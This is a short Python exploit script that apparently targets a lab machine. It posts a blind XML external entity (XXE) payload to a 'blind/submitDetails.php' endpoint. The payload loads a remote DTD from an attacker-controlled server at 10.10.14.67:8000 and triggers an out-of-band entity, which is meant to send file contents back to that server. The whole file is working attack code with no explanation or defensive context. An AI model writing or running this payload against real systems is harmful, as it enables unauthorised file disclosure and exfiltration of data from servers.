#!/usr/bin/python3


import requests
import sys
from pwn import *


def sending_blind_data(url):
    p = log.progress("starting the hacking xd")
    payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.14.67:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>'''

    headers = {
        "Content-Type":"application/xml"    
    }

    log.info('generating blind payloads')
    sess = requests.session()
    ress = sess.post(url+'blind/submitDetails.php',
            headers=headers, data=payload)

    print(ress.text)


def main():
    try:
        url = sys.argv[1]
        sending_blind_data(url)
    except Exception as e:
        print(str(e))
        log.failure('FAIL!!!')
        exit(1)



if __name__ == "__main__":
    main()
